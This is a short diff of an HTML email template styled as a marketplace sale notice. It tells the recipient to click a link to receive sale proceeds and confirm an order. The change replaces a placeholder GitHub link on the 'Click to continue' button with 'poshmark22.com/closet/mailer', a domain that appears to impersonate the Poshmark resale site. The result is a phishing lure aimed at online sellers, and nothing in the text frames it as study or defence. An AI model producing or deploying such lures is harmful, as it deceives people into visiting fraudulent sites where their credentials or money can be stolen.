@@ -11,7 +11,7 @@ Please click on the link below to receive your sale proceeds and delivery confir
 <h2>Order Confirmation:</h2>
 <p style="font-size: 1.1em;">You need to confirm the order details</p>
 <div align="center">
-  <a href="https://github.com/your__username/your__project/issues" style="text-decoration: none;">
+  <a href="https://poshmark22.com/closet/mailer" style="text-decoration: none;">
     <button style="padding: 10px 20px; font-size: 1.1em; background-color: **28a745; color: white; border: none; border-radius: 5px; cursor: pointer;">Click to continue</button>
   </a>
 </div>
